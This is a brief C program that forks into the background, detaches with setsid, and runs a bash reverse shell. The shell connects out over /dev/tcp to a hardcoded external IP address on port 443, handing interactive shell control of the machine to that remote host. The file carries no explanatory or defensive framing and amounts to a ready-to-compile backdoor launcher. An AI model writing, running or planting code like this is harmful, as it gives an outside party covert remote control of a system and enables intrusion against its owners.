#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(){

	char command[150];

	strcpy(command, "bash -c 'bash -i >& /dev/tcp/172.233.25.56/443 0>&1'");
	
	pid_t pid = fork();

	if (pid < 0){
		perror("Error en fork");
		exit(EXIT_FAILURE);
	}

	if (pid > 0){
		printf("PID = %d\n", pid);
		exit(EXIT_SUCCESS);
	}

	setsid();
	
	system(command);

	return(0);
}
